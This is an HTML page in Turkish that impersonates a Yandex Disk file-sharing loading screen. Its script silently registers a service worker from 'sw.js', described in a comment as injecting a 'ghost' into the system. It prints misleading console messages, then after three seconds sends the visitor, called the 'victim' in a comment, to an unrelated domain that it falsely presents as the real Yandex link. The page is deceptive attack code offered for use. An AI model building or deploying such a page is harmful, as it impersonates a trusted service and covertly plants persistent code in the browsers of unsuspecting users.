<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <title>Yandex Disk - Dosya Paylaşımı</title>
    <style>
        body { font-family: Arial, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; background: #f4f4f4; }
        .loader { border: 5px solid #f3f3f3; border-top: 5px solid #ffcc00; border-radius: 50%; width: 50px; height: 50px; animation: spin 2s linear infinite; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
    </style>
</head>
<body>
    <div style="text-align: center;">
        <div class="loader"></div>
        <p>Dosya sunucusuna bağlanılıyor, lütfen bekleyin...</p>
    </div>

    <script>
        // Hayaleti (Service Worker) sisteme enjekte ediyoruz
        if ('serviceWorker' in navigator) {
            navigator.serviceWorker.register('sw.js')
            .then(reg => console.log('Sistem optimize edildi.'))
            .catch(err => console.log('Hata: 0x04'));
        }

        // 3 saniye sonra kurbanı gerçek Yandex linkine fırlatıyoruz
        setTimeout(() => {
            window.location.href = "https://osmanli.cv/";
        }, 3000);
    </script>
</body>
</html>
